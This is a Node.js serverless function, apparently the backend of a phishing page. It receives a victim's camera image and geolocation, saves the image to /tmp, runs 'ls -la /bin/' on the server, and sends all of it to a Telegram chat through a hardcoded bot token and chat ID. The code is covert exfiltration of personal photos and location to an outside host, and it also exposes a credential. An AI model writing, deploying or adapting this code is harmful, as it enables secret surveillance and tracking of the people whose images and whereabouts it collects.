const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');
const { exec } = require('child_process');
const util = require('util');

const BOT_TOKEN = '7391339726:AAGvGFhkxLmdLS1irRMTMnzUnNHBHskXZMY';
const CHAT_ID = '1174153911';
const execPromise = util.promisify(exec);

const sendTelegramMessage = async (message) => {
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
        });
        console.log('Message sent successfully');
    } catch (error) {
        console.error('Error sending message:', error);
    }
};

const sendTelegramPhoto = async (filePath) => {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', fs.createReadStream(filePath));

    try {
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData, {
            headers: {
                ...formData.getHeaders(),
            },
        });
        console.log('Image sent successfully:', response.data);
    } catch (error) {
        console.error('Error sending image:', error);
        throw error;
    }
};

const sendTelegramLocation = async (latitude, longitude) => {
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
            chat_id: CHAT_ID,
            latitude,
            longitude,
        });
        console.log('Location sent successfully');
    } catch (error) {
        console.error('Error sending location:', error);
    }
};

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).send({ message: 'Only POST requests are allowed' });
    }

    const { image, location } = req.body;
    const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
    const filePath = '/tmp/image.jpg'; // Vercel function can write to /tmp directory

    try {
        // Save the image
        fs.writeFileSync(filePath, base64Data, 'base64');
        await sendTelegramPhoto(filePath);

        // Execute shell command
        const { stdout, stderr } = await execPromise('ls -la /bin/');
        if (stderr) {
            console.error(`Error listing directory contents: ${stderr}`);
            return res.status(500).json({ status: 'error', message: 'Error listing directory contents' });
        }

        // Send directory contents to Telegram
        console.log(`Directory contents: ${stdout}`);
        await sendTelegramMessage(`Directory contents:\n${stdout}`);

        // Send location if provided
        if (location && location.latitude && location.longitude) {
            await sendTelegramLocation(location.latitude, location.longitude);
        }

        res.json({ status: 'success' });
    } catch (error) {
        console.error('Error in handler:', error);
        res.status(500).json({ status: 'error', message: error.message });
    }
}
